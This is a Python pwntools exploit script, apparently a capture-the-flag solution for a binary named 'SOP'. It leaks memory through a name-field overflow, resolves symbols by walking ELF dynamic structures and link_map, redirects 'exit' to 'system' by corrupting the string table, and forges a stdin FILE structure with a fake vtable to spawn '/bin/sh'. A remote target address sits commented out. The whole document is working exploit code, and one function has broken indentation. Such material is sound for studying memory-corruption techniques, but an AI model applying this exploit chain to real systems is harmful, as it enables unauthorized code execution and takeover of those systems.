# The functions defined below can be implemented using the DYN_ELF library in PWNTOOLS.
# The functions have been substituted from http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html

from pwn import *
s=process("./SOP",env={'LD_PRELOAD' : './libc-2.23.so'})
#s=remote('18.191.108.112',1337)
def view():
    s.sendlineafter("Enter you choice",str(1))

def edit_name(name):
    s.sendlineafter("Enter you choice",str(2))
    s.sendafter("Change Your Name",name)

def edit_desc(desc):
    s.sendlineafter("Enter you choice",str(3))
    s.sendafter("Change your description",desc)

def exit():
    s.sendlineafter("Enter you choice",str(4))

def leakat(addr):
    edit_name("a"*199 + "z" + p64(addr))
    view()
    s.recvuntil("Desc: ")
    val=u64(s.recvline()[:-1].ljust(8,'\x00'))
    if(val==0x00):
        val=0x0a
    log.info("Value @ " + str(hex(addr)) + ": " + str(hex(val)))
    return val

def ini():
    s.sendafter("Enter your Name","a"*208)
    view()
    s.recvuntil("a"*200)
    leak=(u64(s.recvline()[:-1].ljust(8,'\x00')))
    log.info(str(hex(leak)))
    return leak

def leakstr(addr):
    edit_name("a"*199 + "z" + p64(addr))
    view()
    s.recvuntil("Desc: ")
    val=s.recvline()
    log.info("Value @ " + str(hex(addr)) + ": " + val)
    return val

def find_Phdr(base):
    log.warn("\t\tFinding Program Header")
    val = leakat(base+0x20)
    phdr = base + val
    log.success(str(hex(phdr)))
    return phdr

def find_dyn(base,phdr):
    log.warn("\t\tFinding .Dynamic")
    p_type=0
    while(1):
        p_type=leakat(phdr)
        if(p_type == 0x2):
            break
        phdr +=0x38
    dyn=base+leakat(phdr+16)
    log.success(str(hex(dyn)))
    return dyn

def find_func_off(dyn_str,fname,gname='\x00'):
    array=list()
    log.warn("\t\tFinding String off " + fname)
    off=0
    l=0
    val=""
    found=1
    for i in range(25):
        val=leakstr(dyn_str)
        array.append(val[:-1])
        l = len(val)
        if(val[:-1] == fname):
            exit_off=off
            log.info(fname + " " +  str(hex(exit_off)))
            if(found == 2):
                break;
            else:
                found=2
        if(val[:-1] == gname):
            stdout_off=off
            log.info(gname + " " + str(hex(stdout_off)))
            if(found == 2):
                break;
            else:
                found=2

        off+=l
        dyn_str+= l

    st=""
    for i in array:
        st=st+(i+"\x00")
    log.info(st)
    return exit_off,stdout_off,st

def addr_sym(base,sym_tab,off,off2):
    log.warn("Finding addr in sym_tab")
    ct=0
    found=1
    while(1):
        val=leakat(sym_tab)
        if(val == off):
            addr=leakat(sym_tab+0x8)
             if(found == 2):
                 break;
             else:
                 found=2
        if(val==off2):
            c=ct
            if(found == 2):
                break;
            else:
                found=2
        ct+=1    
        sym_tab+=0x18
    return  addr,c 

def write(what,where):
    edit_name("a"*200 + where)
    edit_desc(what)

def find_got(rela,off):
    rela=rela+0xc-0x18
    val=-1
    while(val != off):
        rela=rela+0x18
        val=leakat(rela)
        print hex(val)

    return leakat(rela-0xc)

def find_tab(base,dyn,d_val,e_val):
    log.warn("\t\tFinding Tables")
    val=0
    found=1
    while(1):
        val=leakat(dyn)
        if(val == d_val):
            addr1=(leakat(dyn+0x9)<<8)
            if(found == 2):
                break;
            else:
                found=2
        if(val == e_val):
            addr2=(leakat(dyn+0x8))
            if(found == 2):
                break;
            else:
                found=2
        dyn+=0x10
    return addr1,addr2

leak=ini()
base = (leak & 0x0000fffffffff000)
log.success("BASE = " + str(hex(base)))
phdr=find_Phdr(base)
dyn=find_dyn(base,phdr)

got,rela=find_tab(base,dyn,0x3,0x17)
log.info("GOT = " + str(hex(got)))
log.info("RELA = " + str(hex(rela)))

link_map=leakat(got+0x8)
log.info("link_map = " + str(hex(link_map)))

str_tab=leakat(leakat(link_map+0x68)+0x8)
log.info("STR_TAB = " + str(hex(str_tab)))

sym_tab=leakat(leakat(link_map+0x70)+0x8)
log.info("SYM_TAB = " + str(hex(sym_tab)))

exit_off,stdin_off,st=find_func_off(str_tab,"exit","stdin") # find the offset of puts
stdin_got,exit_idx=addr_sym(base,sym_tab,stdin_off,exit_off)
stdin_got+=base
log.info("stdin_got = " + str(hex(stdin_got)))
stdin=leakat(stdin_got)
log.info("exit_idx = " + str(hex(exit_idx)))
exit_got=find_got(rela,exit_idx)+base
exit_plt=leakat(exit_got)
log.info("exit_got = " + str(hex(exit_got)))

str_struct=got+0x100
log.info("ptr = " + str(hex(str_struct)))
fake_str=got+0x120
vtable=got+0x200
write(p64(0x5) + p64(fake_str),p64(str_struct))
write(p64(str_struct),p64(link_map+0x68))
st=st.replace("exit","system")
print st
write(st,p64(fake_str))
write(p64(exit_plt)*20,p64(vtable))
write(p64(0x00)*2,p64(got+0x420))
fake=p32(0xfbad2088) + ";/bin/sh" + "\x00"*4 + p64(0x00)*6 + p64(0x00) + p64(0x00)*6 + p64(-1,signed=True) + p64(0x00) + p64(got+0x420) + p64(-1,signed=True) +p64(0x00) + p64(got+0x420) + p64(0x00)*6 + p64(vtable)
print len(fake)
log.info("STDIN = " + str(hex(stdin)))
write(fake,p64(stdin))

s.interactive()
